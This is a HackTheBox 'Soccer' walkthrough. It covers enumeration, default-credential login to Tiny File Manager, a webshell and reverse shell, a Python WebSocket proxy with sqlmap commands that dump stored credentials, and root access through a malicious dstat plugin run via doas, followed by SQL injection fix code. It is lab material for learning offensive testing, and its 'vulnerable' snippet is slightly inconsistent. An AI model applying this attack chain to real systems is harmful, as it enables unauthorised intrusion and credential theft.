# **Soccer**

### *Machine enumeration*
```ad-summary
title: nmap result
collapse: open

Nmap scan report for 10.129.112.129
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
| 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_ 256 5797565def793c2fcbdb35fff17c615c (ED25519)

80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/

9091/tcp open xmltec-xmlmail?
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
| HTTP/1.1 400 Bad Request
| Connection: close
| GetRequest:
| HTTP/1.1 404 Not Found
| Content-Security-Policy: default-src 'none'
| X-Content-Type-Options: nosniff
| Content-Type: text/html; charset=utf-8
| Content-Length: 139
| Date: Sat, 17 Dec 2022 19:12:14 GMT
| Connection: close
| <!DOCTYPE html>
| <html lang="en">
| <head>
| <meta charset="utf-8">
| <title>Error</title>
| </head>
| <body>
| Cannot GET /
| </body>
| </html>
| HTTPOptions, RTSPRequest:
| HTTP/1.1 404 Not Found
| Content-Security-Policy: default-src 'none'
| X-Content-Type-Options: nosniff
| Content-Type: text/html; charset=utf-8
| Content-Length: 143
| Date: Sat, 17 Dec 2022 19:12:14 GMT
| Connection: close
| <!DOCTYPE html>
| <html lang="en">
| <head>
| <meta charset="utf-8">
| <title>Error</title>
| </head>
| <body>
| Cannot OPTIONS /
| </body>
|_ </html>

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port9091-TCP:V=7.93%I=7%D=12/17%Time=639E149A%P=x86_64-pc-linux-gnu%r(i

SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\

SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\

SF:x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r

SF:\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-O

SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC

SF:ontent-Length:\x20139\r\nDate:\x20Sat,\x2017\x20Dec\x202022\x2019:12:14

SF:\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n<
SF:/head>\n<body>\nCannot\x20GET\x20/\n</body>\n</html>\n")%r(H
SF:TTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po
SF:licy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143
SF:\r\nDate:\x20Sat,\x2017\x20Dec\x202022\x2019:12:14\x20GMT\r\nConnection
SF::\x20close\r\nr\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<m
SF:eta\x20charset=\"utf8\">\n<title>Error</title>\n</head>\n<body>\n
SF:Cannot\x20OPTINS\x20/\n</body>\n</html>\n")%r(RTSPRequest,16C,"H
SF:TTP/1\.1\x20404x20Not\x20Found\r\nContent-Security-Policy:\x20default-
SF:rc\x20'none'\r\nX-Content-TypeOptions:\x20nosniff\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-\r\nContent-Length:\x20143\r\nDate:\x20Sat,
SF:\x2017\x20Dec\202022\x2019:12:14\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20tml>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"
SF:utf8\">\n<tite>Error</title>\n</head>\n<body>\nCannot\x20OPTIONS
SF:\x20/\n<body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\rnConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2
SF:F,"HTTP/1\.1\x0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
SF:%r(DNSStatusReuestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20closer\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```ad-important
title: Domains
collapse: open

- **soccer.htb**
- **soc-player.soccer.htb**
```

```ad-error
title: Found Credentials
collapse: open

- player:PlayerOftheMatch2022
```


I checked the nmap results and found that ports 22, 80, and 9091 were open.

I looked at port 9091 but found nothing important, so I switched to port 80. The main page of the web app was plain and didn't have a login button or search box.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_003.png]]

So i started the fuzzing process to find more path, maybe we can find something that is useful and will help us to solve this box.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_004.png]]

>Command
>```bash
>ffuf -u "http://soccer.htb/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt

The outcome of the dirsearch was not satisfactory. However, I continued my search using the [[ffuf]] tool for directory brute-forcing, which led me to discover a new path named *"tiny"*.

So great now we found something lets take look at this new path !!

![[Pasted image 20230202163631.png]]

*Tiny File Manager*, Great WTF is Tiny File Manager, with a quick search i found the default creds for this web app. I used them to access the admin dashboard successfully.

> [!info] Tiny Defaul Creds
> admin:admin@123
> user:12345.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_005.png]]

### *Foothold*

Now we are in the admin dashboard and we can do things like upload files and etc, but the most important feature for us is the upload feature.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_006.png]]

So i tried to upload a php file in the main folder but it didn't worked because the folder was not writable.

After that i found a new directory and tried to upload a webshell in this directory to get RCE on the Server.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_008.png]]

![[HackTheBox/Machines/Easy/Soccer/images/Selection_007.png]]

Great we can confirm that we have a webshell, so i just created a classic php reverse shell and uploaded on the server. After invoking the reverse shell, I was able to obtain a shell on the server.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_010.png]]

Great we got shell 💥💥💥💥

So I just looked at the nginx configuration file to make sure we don't have any other vhosts left, and guess what I found, a new vhost and maybe we can do some interesting things with this new vhost.

New VHOST: **soc-player.soccer.htb**

The new vhost had additional features, including a login/signup page. I created an account and logged in successfully.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_013.png]]

After that i was on my dashboard i found a input box which was for ticket numbers.

![[Pasted image 20230202164846.png]]

While testing the web app, I realized that it was using web sockets to obtain data from the server for each ticket number. 

This made me think that there might be a SQL injection vulnerability.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_014.png]]

We can see that the client is requesting a connection upgrade to the server for the WebSocket.

```log
Sec-WebSocket-Version: 13
Upgrade: websocket
```

After some searching, I came across a blog about [Blind SQL injection over WebSocket] (https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) The blog had a Python proxy that we could use with sqlmap to determine if the WebSocket was vulnerable to SQL injection.

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/ws"

def send_ws(payload):

	ws = create_connection(ws_server)
	message = unquote(payload).replace('"','\'')
	data = '{"id":"%s"}' % message
	ws.send(data)
	resp = ws.recv()
	ws.close()
	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):

	def do_GET(self) -> None:
	self.send_response(200)
	try:	
		payload = urlparse(self.path).query.split('=',1)[1]	
	except IndexError:	
		payload = False	
	if payload:	
		content = send_ws(payload)	
	else:	
		content = 'No parameters specified!'
	self.send_header("Content-type", content_type)
	self.end_headers()
	self.wfile.write(content.encode())
	return
	
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

This was our python proxy, which i modified to work in our case.

And now lets see if SQLMap can find something for us.

First we [[SQLMap#List databases | list databases with sqlmap]]

>Command
>```bash
>sqlmap -u 'http://localhost:8081/?id=' -p 'id' --batch --risk 3 --level 5 --dbs

```log
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

YEAAAA 🥳🥳 The SQL Injection worked and now we can dump the soccer_db.

Than we just [[SQLMap#List tables| list the tables]] from the *soccer_db* DB.

>Command
>```bash
>sqlmap -u 'http://localhost:8081/?id=' -p 'id' --batch --risk 3 --level 5 -D soccer_db  --tables

```log
[1 table]
+----------+
| accounts |
+----------+
```

And now we can easiliy [[SQLMap#Dump table data|dump the data]] that is in the accounts table.

>Command
>```bash
>sqlmap -u 'http://localhost:8081/?id=' -p 'id' --batch --risk 3 --level 5 -D soccer_db  -T accounts --dump

```log
id,email,password,username
1324,player@player.htb,PlayerOftheMatch2022,player
```

And BOOOMMMMM 💥💥💥 We were able to obtain a username and password. I noticed that this username was listed in the server's /etc/passwd file, so we can try to log into the account using SSH with these credentials.

DANGGGG IT! Now we have access to the box as the user 'player' and, as expected, we were able to retrieve the user flag.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_024.png]]

#### SQL Injection vuln Fix

According to OWASP, input sanitization is a prevalent vulnerability in websockets. This was also evident in the case of the soccer box, where I discovered an input sanitization vulnerability upon analyzing the source code. Upon further examination, I also found a SQL Injection vulnerability.

link: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/10-Testing_WebSockets

```js
socket.on('connection', ws=> {
  ws.on('message', function incoming(data) {
    try {
      var id = JSON.parse(data).id;
    } catch (e) {
      //console.log(e);
    }
    (async () => {
          try {
            const query = `Select id,username,password  FROM accounts where id = ${id}`;
            await connection.query(secureQuery, [id], function (error, results, fields) {
                if (error) {
                  ws.send("Ticket Doesn't Exist");
                } else {
                  if (results.length > 0) {
                    ws.send("Ticket Exists")
                  } else {
                    ws.send("Ticket Doesn't Exist")
                  }
                }
              });
          } catch (error) {
            ws.send("Error");
          }
      })()
   });
});
```

o, the first security vulnerability is the usage of an untrusted source (*id* parameter) in a SQL query. To mitigate this, we need to create a function that validates the user input to ensure that it's only numbers.

The second vulnerability is related to the direct concatenation of untrusted user input in the SQL statement, which can lead to SQL injection attacks. To fix this issue, we need to use placeholders in the SQL statement instead of directly concatenating the untrusted input.

By fixing these vulnerabilities, we can prevent sensitive information from being dumped from the database.

```js
function validateUserInput(input) {
  return{
    error: isNaN(input)
  }
}
```

And then, we call this validation function to ensure the input is secure.

```js
try {
      var id = JSON.parse(data).id;
      if (validateUserInput(id).error) {
        ws.send("Invalid Input");
        return;
      }
    } catch (e) {
      //console.log(e);
    }
```

To address the SQL injection vulnerability in the query, we should use placeholders instead of concatenating the user input directly into the SQL statement.

```js
async () => {
          try {
            //const query = `Select id,username,password  FROM accounts where id = ${id}`;
            const secureQuery = `Select id,username,password  FROM accounts where id = ?`;
            await connection.query(secureQuery, [id], function (error, results, fields) {
                if (error) {
                  ws.send("Ticket Doesn't Exist");
                } else {
                  if (results.length > 0) {
                    ws.send("Ticket Exists")
                  } else {
                    ws.send("Ticket Doesn't Exist")
                  }
                }
              });
          } catch (error) {
            ws.send("Error");
          }
      })
```

For instance, in this code, we have a variable 'secureQuery' which includes a placeholder and then we pass both the query and the user input 'id' to the query function.

### *Privilege escalation*

So lets go for the root part.

Like always i just searched for SUID binaries and found a binary that i never saw before.

>Command
>```bash
>find / -perm -4000 2>/dev/null 

![[HackTheBox/Machines/Easy/Soccer/images/Selection_025.png]]

The */usr/local/bin/doas* binary was something new for me, so I searched about it and found out that this binary can execute commands as other users.

```ad-info
title: DOAS
doas (“dedicated openbsd application subexecutor”) is **a program to execute commands as another user**. The system administrator can configure it to give specified users privileges to execute specified commands. It is free and open-source under the ISC license and available in Unix and Unix-like operating systems.
```

![[HackTheBox/Machines/Easy/Soccer/images/Selection_026.png]]

OK WAIT A MINUTE, EXECUTING COMMAND AS OTHER USERS !!!!

That's exactly what we want, this is our joker for the privilege escalation.

So looking at the doas config file i found out that we can only run dstat as root !

```bash
cat /usr/local/etc/doas.conf
> permit nopass player as root cmd /usr/bin/dstat
```

So now WTF is dastat ? 😅😅😅😅

After a quick search i found out that dstat is simple program resource monitoring tool.

```ad-info
title: DSTAT

dstat is **a tool that is used to retrieve information or statistics form components of the system such as network connections, IO devices, or CPU, etc**. It is generally used by system administrators to retrieve a handful of information about the above-mentioned components of the system.
```

And now we can executing this tool as root, so why should be  a resource monitoring tool interesting for the privilege escalation part? 

That was the first question that I asked myself.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_028.png]]

But after playing around with this tool i found out that we can create our own plugin.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_029.png]]

This tool already has some default plugins, but according to the documentation, we can create custom plugins and place them in one of the tool's folders.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_032.png]]

![[HackTheBox/Machines/Easy/Soccer/images/Selection_031.png]]

So great, I just tested */usr/share/dstat* but we didn't have write access to this folder. 

So i just checked the privileges on */usr/local/share/dstat* and guess what, the user player has write privilege on this folder.

After checking the privileges on _/usr/local/share/dstat_, I discovered that the user player has write privileges on this folder. 

I created a fake python plugin called dstat_privesc.py.

>Payload
>```py
>import os
>os.system('bash')

This script will spawn a shell for us when it's executed, and when root executes this script, we will get a shell as root. 

After creating the payload, we should now run the dstat program with the name of the plugin.

>Command
>```bash
>doas /usr/bin/dstat --privesc

Anddd BOOOOMMMMMM 💥💥💥💥

After executing this command we got a shell as root and we got the root flag as well.

![[HackTheBox/Machines/Easy/Soccer/images/Selection_033.png]]

---
#### Lessons learned
- Websocket secrurity
- SQL Injeciton over websockets
---

Machine tags:

- #Linux 
- #SQLInjection 
- #Websocket
- #dstat

---
